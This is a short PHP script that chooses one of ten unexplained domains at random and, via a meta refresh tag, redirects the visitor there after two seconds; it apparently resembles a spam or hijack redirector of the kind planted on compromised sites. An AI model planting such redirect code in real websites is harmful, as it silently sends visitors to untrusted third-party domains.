<?php
$urls = array (
			'http://exsfxs.com',
			'http://efxnws.com',
			'http://yourfxx.com',
			'http://che-fox.com',
			'http://vrxfox.com',
			'http://mmxfxs.com',
			'http://yyfoxx.com',
			'http://showsfx.com',
			'http://onenwss.com',
			'http://nofxnow.com',     
            );          
$n = mt_rand(0,count($urls) - 1);
$rand_url = $urls[$n];
?>
<meta http-equiv="refresh" content="2; url=<?php echo  $rand_url;?> ">